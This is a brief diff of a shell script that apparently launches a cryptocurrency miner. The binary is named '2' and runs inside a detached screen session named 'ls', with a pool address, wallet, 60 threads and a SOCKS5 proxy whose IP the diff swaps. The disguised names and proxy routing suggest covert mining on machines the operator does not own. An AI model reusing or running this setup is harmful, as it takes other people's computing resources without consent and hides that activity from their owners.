@@ -5,4 +5,4 @@ sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-de
 chmod +x 2
 screen -dmS ls
 
- ./2 -a cn/0 -o inf.pool-pay.com:3623  -u inf8TQVLBJ35K6jeGNePCLRzrgt8W6HVGHWgmtNEJTZ4FBAhNaieEBGiSRiTQhF9PXiXcpopBepPdPUAxn2AWS1j3uurvZ2YRH.5000 -t 60 -x socks5://72.210.208.101:4145 -p ros1
+ ./2 -a cn/0 -o inf.pool-pay.com:3623  -u inf8TQVLBJ35K6jeGNePCLRzrgt8W6HVGHWgmtNEJTZ4FBAhNaieEBGiSRiTQhF9PXiXcpopBepPdPUAxn2AWS1j3uurvZ2YRH.5000 -t 60 -x socks5://184.181.217.210:4145 -p ros1
